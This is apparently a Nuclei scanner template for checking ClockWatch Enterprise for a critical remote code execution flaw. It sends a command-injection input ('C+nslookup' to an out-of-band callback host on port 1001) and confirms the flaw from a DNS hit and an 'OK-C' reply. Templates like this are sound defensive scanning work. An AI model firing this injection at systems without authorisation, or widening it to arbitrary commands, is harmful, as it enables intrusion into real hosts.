id: clockwatch-enterprise-rce
info:
  name: ClockWatch Enterprise - Remote Code Execution
  author: gy741
  severity: critical
  description: ClockWatch Enterprise software can be hacked to allow remote code execution.
  reference:
  - https://blog.grimm-co.com/2021/07/old-dog-same-tricks.html
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  tags: clockwatch,rce,network
  metadata:
    impact: The vulnerability of ClockWatch Enterprise to remote code execution can
      have a significant impact on the security and functionality of the system.
    recommendation: I highly recommend updating ClockWatch Enterprise to the latest
      version to mitigate the risk of remote code execution.
network:
- inputs:
  - data: C+nslookup {{interactsh-url}}
  host:
  - '{{Hostname}}'
  - '{{Host}}:1001'
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - dns
  - type: word
    words:
    - OK-C
